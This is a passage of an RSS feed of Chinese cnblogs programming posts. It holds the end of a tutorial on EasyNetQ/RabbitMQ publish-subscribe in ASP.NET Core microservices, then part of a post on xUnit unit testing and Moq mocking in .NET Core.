                bus.Subscribe&lt;/span&gt;&amp;lt;TextMessage&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;my_test_subscriptionid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, HandleTextMessage);

                Console.WriteLine(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Listening for messages. Hit &amp;lt;return&amp;gt; to quit.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
                Console.ReadLine();
            }
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; HandleTextMessage(TextMessage textMessage)
        {
            Console.ForegroundColor &lt;/span&gt;=&lt;span&gt; ConsoleColor.Red;
            Console.WriteLine(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Got message: {0}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, textMessage.Text);
            Console.ResetColor();
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　这里主要是通过IBus实例去订阅消息（这里是除非用户关闭程序否则一直处于监听状态），当发布者发布了指定类型的消息之后，这里就把它打印出来（红色字体显示）。&lt;/p&gt;
&lt;h2&gt;3.4 简单测试 &lt;/h2&gt;
&lt;p&gt;　　通过控制台信息查看结果：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/381412/201807/381412-20180704225210920-464385670.png&quot; alt=&quot;&quot; width=&quot;545&quot; height=&quot;246&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　通过RabbitMQ管理界面查看：&lt;/p&gt;
&lt;p&gt;　　（1）通过Connections Tab可以发现我们的两个客户端都在Running中&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/381412/201807/381412-20180704225427102-1692841459.png&quot; alt=&quot;&quot; width=&quot;487&quot; height=&quot;261&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　（2）通过Queues Tab查看目前已有的队列=&amp;gt;可以看到目前我们只注册了一个队列&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/381412/201807/381412-20180704225822213-1096337374.png&quot; alt=&quot;&quot; width=&quot;574&quot; height=&quot;226&quot;/&gt;&lt;/p&gt;

&lt;h2&gt;4.1 案例结构与说明&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/381412/201807/381412-20180704235604667-635214988.png&quot; alt=&quot;&quot; width=&quot;637&quot; height=&quot;280&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　这里假设有这样一个场景，客户通过浏览器提交了一个保单，这个保单中包含一些客户信息，ClientService将这些信息处理后发送一个消息到RabbitMQ中，NoticeService和ZAPEngineService订阅了这个消息。NoticeService会将客户信息取出来并获取一些更多信息为客户发送Email，而ZAPEngineService则会根据客户的一些关键信息（比如：年龄，是否吸烟，学历，年收入等等）去数据库读取一些规则来生成一份Question List并存入数据库。&lt;/p&gt;
&lt;h2&gt;4.2 项目准备工作&lt;/h2&gt;
&lt;p&gt;　　创建上面提到的这几个项目，这里我选择ASP.NET Core WebAPI类型。&lt;/p&gt;
&lt;p&gt;　　分别为这几个项目通过NuGet安装EasyNetQ组件，并且通过以下代码注入统一的IBus实例对象：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt;&lt;span&gt; IServiceProvider ConfigureServices(IServiceCollection services)
    {
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; IoC - EventBus&lt;/span&gt;
      services.AddSingleton(RabbitHutch.CreateBus(Configuration[&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;MQ:Dev&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;]));
      ......
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　这里我将连接字符串写到了配置文件中，请参考上面的QuickStart中的内容。&lt;/p&gt;
&lt;p&gt;　　下面是这个demo用到的一个消息对象实体：通过标签声明队列名称。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
    [Queue(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Qka.Client&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, ExchangeName = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Qka.Client&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ClientMessage
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; ClientId { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; ClientName { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Sex { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; Age { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; N: Non-Smoker, S: Smoker&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; SmokerCode { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Bachelor, Master, Doctor&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Education { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;decimal&lt;/span&gt; YearIncome { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　此外，为了充分简化代码量，EasyNetQ提供了一个AutoSubscriber的方式，可以通过接口和标签快速地让一个类成为Consumer。详细内容参考：&lt;a href=&quot;https://github.com/EasyNetQ/EasyNetQ/wiki/Auto-Subscriber&quot; target=&quot;_blank&quot;&gt;https://github.com/EasyNetQ/EasyNetQ/wiki/Auto-Subscriber&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;　　这里为了快速的在项目中使用Subscriber，添加一个扩展方法，它会从注入的服务中取出IBus实例对象，并自动帮我们进行Subscriber（那些实现了IConsume接口的类）的注册。具体用法见后面的介绍。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; AppBuilderExtension
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; IApplicationBuilder UseSubscribe(&lt;span&gt;this&lt;/span&gt; IApplicationBuilder appBuilder, &lt;span&gt;string&lt;/span&gt;&lt;span&gt; subscriptionIdPrefix, Assembly assembly)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; services =&lt;span&gt; appBuilder.ApplicationServices.CreateScope().ServiceProvider;

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; lifeTime = services.GetService&amp;lt;IApplicationLifetime&amp;gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; bus = services.GetService&amp;lt;IBus&amp;gt;&lt;span&gt;();
            lifeTime.ApplicationStarted.Register(() &lt;/span&gt;=&amp;gt;&lt;span&gt;
            {
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; subscriber = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; AutoSubscriber(bus, subscriptionIdPrefix);
                subscriber.Subscribe(assembly);
                subscriber.SubscribeAsync(assembly);
            });

            lifeTime.ApplicationStopped.Register(() &lt;/span&gt;=&amp;gt;&lt;span&gt; bus.Dispose());

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; appBuilder;
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;4.3 Publisher：ClientService&lt;/h2&gt;
&lt;p&gt;　　ClientService作为消费者，这里假设我们在API中处理完业务代码后，将message发布给RabbitMQ：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
    [Produces(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;application/json&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    [Route(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;api/Client&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ClientController : Controller
    {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt;&lt;span&gt; IClientService clientService;
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt;&lt;span&gt; IBus bus;

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; ClientController(IClientService _clientService, IBus _bus)
        {
            clientService &lt;/span&gt;=&lt;span&gt; _clientService;
            bus &lt;/span&gt;=&lt;span&gt; _bus;
        }

        ......

        [HttpPost]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; Task&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;&lt;span&gt; Post([FromBody]ClientDTO clientDto)
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Business Logic here...
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; eg.Add new client to your service databases via EF
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Sample Publish&lt;/span&gt;
            ClientMessage message = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ClientMessage
            {
                ClientId &lt;/span&gt;=&lt;span&gt; clientDto.Id.Value,
                ClientName &lt;/span&gt;=&lt;span&gt; clientDto.Name,
                Sex &lt;/span&gt;=&lt;span&gt; clientDto.Sex,
                Age &lt;/span&gt;= &lt;span&gt;29&lt;/span&gt;&lt;span&gt;,
                SmokerCode &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;N&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                Education &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Master&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                YearIncome &lt;/span&gt;= &lt;span&gt;100000&lt;/span&gt;&lt;span&gt;
            };
            &lt;/span&gt;&lt;span&gt;await&lt;/span&gt;&lt;span&gt; bus.PublishAsync(message);

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Add Client Success! You will receive some letter later.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　当然，你可以使用同步方法：bus.Publish(message);&lt;/p&gt;
&lt;h2&gt;4.4 Subscriber: NoticeService &amp;amp; ZAPEngineService&lt;/h2&gt;
&lt;p&gt;　　（1）NoticeService：新增一个实现IConsume接口的Consumer类&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; ClientMessageConsumer: IConsumeAsync&amp;lt;ClientMessage&amp;gt;&lt;span&gt;
    {
        [AutoSubscriberConsumer(SubscriptionId &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ClientMessageService.Notice&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Task ConsumeAsync(ClientMessage message)
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Your business logic code here
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; eg.Build one email to client via SMTP service
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Sample console code&lt;/span&gt;
            System.Console.ForegroundColor =&lt;span&gt; System.ConsoleColor.Red;
            System.Console.WriteLine(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Consume one message from RabbitMQ : {0}, I will send one email to client.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, message.ClientName);
            System.Console.ResetColor();

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Task.CompletedTask;
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　这里为了演示效果，增加了一些输出信息的代码，下面的ZAPEngineService也是一样，不再赘述。&lt;/p&gt;
&lt;p&gt;　　（2）ZAPEngineService：新增一个实现IConsume接口的Consumer类&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; ClientMessageConsumer : IConsumeAsync&amp;lt;ClientMessage&amp;gt;&lt;span&gt;
    {
        [AutoSubscriberConsumer(SubscriptionId &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ClientMessageService.ZapQuestion&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Task ConsumeAsync(ClientMessage message)
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Your business logic code here
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; eg.Generate one ZAP question records into database and send to client
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Sample console code&lt;/span&gt;
            System.Console.ForegroundColor =&lt;span&gt; System.ConsoleColor.Red;
            System.Console.WriteLine(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Consume one message from RabbitMQ : {0}, I will generate one ZAP question list to client&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, message.ClientName);
            System.Console.ResetColor();

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Task.CompletedTask;
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　注意两个Consumer的SubscriptionId不能一样，否则无法接受到消息。&lt;/p&gt;
&lt;p&gt;　　（3）为两个Consumer使用扩展方法：UseSubscribe&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Configure(IApplicationBuilder app, IHostingEnvironment env, IApplicationLifetime lifetime)
    {
        ......

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; easyNetQ&lt;/span&gt;
        app.UseSubscribe(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ClientMessageService&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, Assembly.GetExecutingAssembly());
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;4.5 简单测试&lt;/h2&gt;
&lt;p&gt;　　（1）借助Postman向ClientService发起Post请求&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/381412/201807/381412-20180705001232036-686319251.png&quot; alt=&quot;&quot; width=&quot;756&quot; height=&quot;358&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　（2）查看NoticeService的日志信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/381412/201807/381412-20180705001311609-403257971.png&quot; alt=&quot;&quot; width=&quot;639&quot; height=&quot;148&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　（3）查看ZAPEngineService的日志信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/381412/201807/381412-20180705001327016-691936565.png&quot; alt=&quot;&quot; width=&quot;636&quot; height=&quot;138&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　（4）查看RabbitMQ的管理控制台：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/381412/201807/381412-20180705001403125-2140889618.png&quot; alt=&quot;&quot; width=&quot;633&quot; height=&quot;299&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　本篇超级简单地介绍了一下消息队列与RabbitMQ，通过使用EasyNetQ这个基于RabbitMQ.Client的客户端做了一个QuickStart演示了在.NET Core环境下如何进行消息的发布与订阅，并通过一个微服务的小案例演示了如何在ASP.NET Core环境下如何基于EasyNetQ完成消息的发布与订阅，看起来就像一个类似于简单的事件总线。当然，本篇的内容都十分基础，如果要应用好RabbitMQ，还得把那些基础概念（如：Channel，Exchange等）弄清楚，然后去理解一下事件总线的概念，实际中还得考虑数据一致性等等，路途漫漫，继续加油吧！&lt;/p&gt;

&lt;p&gt;　　Click Here =&amp;gt; &lt;a title=&quot;download&quot; href=&quot;https://github.com/EdisonChou/EDC.EasyNetQ.Demo&quot; target=&quot;_blank&quot;&gt;点我下载&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;EasyNetQ官方文档：&lt;a href=&quot;https://github.com/EasyNetQ/EasyNetQ/wiki/Introduction&quot; target=&quot;_blank&quot;&gt;https://github.com/EasyNetQ/EasyNetQ/wiki/Introduction&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;focus-lei，《&lt;a href=&quot;https://www.cnblogs.com/focus-lei/p/9121095.html&quot; target=&quot;_blank&quot;&gt;.net core使用EasyNetQ做EventBus&lt;/a&gt;》&lt;/p&gt;
&lt;p&gt;常山造纸农，《&lt;a href=&quot;https://www.cnblogs.com/struggle999/p/6937530.html&quot; target=&quot;_blank&quot;&gt;RabbitMQ安装配置和基于EasyNetQ驱动的基础使用&lt;/a&gt;》&lt;/p&gt;

&lt;div id=&quot;Copyright&quot; readability=&quot;8.2242990654206&quot;&gt;
&lt;p&gt;作者：&lt;a title=&quot;author&quot; href=&quot;http://www.edisonchou.cn&quot; target=&quot;_blank&quot;&gt;周旭龙&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;出处：&lt;a title=&quot;from&quot; href=&quot;http://edisonchou.cnblogs.com&quot; target=&quot;_blank&quot;&gt;http://edisonchou.cnblogs.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文版权归作者和博客园共有，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文链接。&lt;/p&gt;
&lt;/div&gt;
</description>
<pubDate>Wed, 04 Jul 2018 16:38:00 +0000</pubDate>
<dc:creator>Edison Chou</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/edisonchou/p/aspnetcore_easynetq_basicdemo_foundation.html</dc:identifier>
</item>
<item>
<title>好代码是管出来的——.Net Core中的单元测试与代码覆盖率 - 7m鱼</title>
<link>http://www.cnblogs.com/selimsong/p/9263957.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/selimsong/p/9263957.html</guid>
<description>&lt;p&gt;　　测试对于软件来说，是保证其质量的一个重要过程，而测试又分为很多种，单元测试、集成测试、系统测试、压力测试等等，不同的测试的测试粒度和测试目标也不同，如单元测试关注每一行代码，集成测试关注的是多个模块是否能正常的协同工作。&lt;br/&gt;　　当我们在衡量代码好坏时，其中一点就是这些代码是否进行了单元测试，测试的质量、代码覆盖率怎么样？本文将从以下几个方面介绍.Net Core中的单元测试：&lt;/p&gt;
&lt;h2&gt;单元测试简介&lt;/h2&gt;
&lt;p&gt;　　单元测试是指对软件中的&lt;span&gt;最小可测试单元进行&lt;strong&gt;检查&lt;/strong&gt;和&lt;strong&gt;验证&lt;/strong&gt;&lt;/span&gt;，而.Net中最小可测试单元就是类和方法，单元测试是白盒测试关注于代码执行逻辑，所以单元测试代码一般也由开发人员编写。&lt;br/&gt;　　单元测试关注的两个重点就是最小可测试单元和代码逻辑，但是很多情况下，一个类或者是方法它会依赖一些外部组件，如其他开发人员写的代码、第三方类库、数据库、网络等，当被测试的代码与这些组件紧耦合时，那么这段代码将可能是不可测的，如一个方法中依赖一个数据库组件去访问数据库，那么在执行这个方法时，必然要与数据库交互，如果没有数据库，那么该方法就无法运行。&lt;br/&gt;　　所以单元测试不仅是对代码逻辑进行检查，同时还对整个代码结构有所限制，&lt;span&gt;面向对象编程时应当遵循“依赖倒置”原则，模块应该依赖抽象，抽象不应该依赖实现&lt;/span&gt;。并且所&lt;span&gt;依赖的抽象，应该显示的通过构造或者方法参数进行暴露&lt;/span&gt;，让组件的使用者对组件的依赖一目了然。&lt;br/&gt;　　而在单元测试时为了屏蔽这些抽象依赖，不同测试框架中提供了stub、mock、fake等方式对抽象进行模拟，以便于代码能够正常执行。&lt;/p&gt;
&lt;h2&gt;.Net Core中的单元测试框架&lt;/h2&gt;
&lt;p&gt;　　.Net Core中常用的单元测试的框架有MSTest、NUnit和xUnit.net，它们的使用方法都非常相似，都是通过特性标记的方式声明测试方法，然后在方法中使用断言(Assertions)来判别方法执行结果是否达到预期。&lt;br/&gt;　　这三个框架中MSTest是与VS集成的，而NUnit和xUnit.net都加入了.Net基金会，下面两个图分别是三个框架特性和断言的比较(内容来自：&lt;a href=&quot;https://xunit.github.io/docs/comparisons&quot; target=&quot;_blank&quot;&gt;https://xunit.github.io/docs/comparisons&lt;/a&gt;)：&lt;br/&gt;　　特性：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180704153015988-1986299448.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　断言(部分)：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180704153232274-963321560.png&quot; alt=&quot;&quot;/&gt;　&lt;/p&gt;
&lt;p&gt;　　三个框架自有优点，但xUnit.net使用更广泛一些(许多开源项目都使用xUnit.net，包括ASP.NET Core MVC、EF Core等项目)，支持.Net下的大部分平台(.Net Fx、.Net Core、UWP、Xamarin)，并且具有非常好的可拓展性。&lt;/p&gt;
&lt;h2&gt;使用xUnit.Net对.Net Core应用进行单元测试&lt;/h2&gt;
&lt;p&gt;　　本文使用xUnit.Net框架来对.Net Core程序进行单元测。&lt;/p&gt;
&lt;h3&gt;创建xUnit.Net测试项目&lt;/h3&gt;
&lt;p&gt;　　在解决方案中添加.Net Core的被测试项目以及xUnit测试项目：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180704153335314-1078696581.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　目录结构：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180704155858504-1189628909.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　xUnit测试项目还提供了相应的代码分析器来帮助编写测试代码：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180704160003780-865059870.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;编写测试方法&lt;/h3&gt;
&lt;p&gt;　　在被测试的项目中添加一个计算器类型，并添加加法运算的方法：&lt;/p&gt;
&lt;p&gt; 　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180704160113721-1513920338.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　在测试项目中添加Calulator方法的测试代码：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180704160133801-1927488767.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;断言&lt;/h3&gt;
&lt;p&gt;　　在程序中，断言指的是一个&lt;span&gt;表达式语句执行时总是为真(True)&lt;/span&gt;，它有助于代码阅读、调试、编译和缺陷检测，当断言内表达式执行为True时，不会执行任何操作，当结果为false时将会输出一些异常信息，下图是.Net中System.Diagnositics命名空间下提供的代码调试使用的断言用法(在调试程序时，当参数x &amp;lt; y就会中断并抛出异常信息)：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180704160321518-1908599310.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　更多参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/visualstudio/debugger/assertions-in-managed-code&quot; target=&quot;_blank&quot;&gt;https://docs.microsoft.com/en-us/visualstudio/debugger/assertions-in-managed-code&lt;/a&gt;&lt;br/&gt;　　在单元测试中，测试方法也是使用断言的方式来判别程序执行结果与预期结果是否相符：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180704160541409-385664563.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　xUnit.net中的断言参考：&lt;a href=&quot;https://github.com/xunit/assert.xunit&quot; target=&quot;_blank&quot;&gt;https://github.com/xunit/assert.xunit&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;运行单元测试&lt;/h3&gt;
&lt;p&gt;　　在VS中可以使用VS的测试窗口运行测试方法：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180704160845924-1664846452.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　运行结果(测试通过)：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180704160904908-2121510053.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　运行结果(测试未通过)：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180704160929635-1033416870.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;Mock&lt;/h2&gt;
&lt;p&gt;　　在文章前面提到过，面向对象编程应该显示的依赖抽象，单元测试时应该将屏蔽依赖的影响(无论是依赖还未实现，或者实现的依赖会阻碍代码执行)，为了满足这一需求出现了Mock、Fake等方式，其原理就是创建一个&quot;假&quot;的&quot;空&quot;的依赖，并用其替代真实依赖，以确保代码能够运行。&lt;br/&gt;　　.Net中一个常用的Mock框架是Moq，本文将使用Moq来介绍如何对依赖进行模拟：&lt;br/&gt;　　1. 编写需要依赖的代码：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180704161013117-1151887558.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180704161056758-1725584955.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　上面代码中UserManager依赖一个用户的仓储类型，该仓储将会与数据库交互。&lt;br/&gt;　　2. 为测试项目安装Moq组件：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180704161134282-876044900.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　3. 编写测试代码：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180704162214334-922252738.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　上面代码通过Moq组件Mock了一个IUserRepository的类型，并将其Add方法设置并返回true(&lt;span&gt;注：设置方法时参数的数据要与调用时使用的一致&lt;/span&gt;)，最后通过Mock的对象实例Object来创建UserManager实例。&lt;br/&gt;　　最后断言当创建用户时，年龄为负数则抛出FormatException。&lt;br/&gt;　　4. 运行测试：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/640251/201807/640251-20180705002851673-1132075122.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　测试成功。&lt;/p&gt;
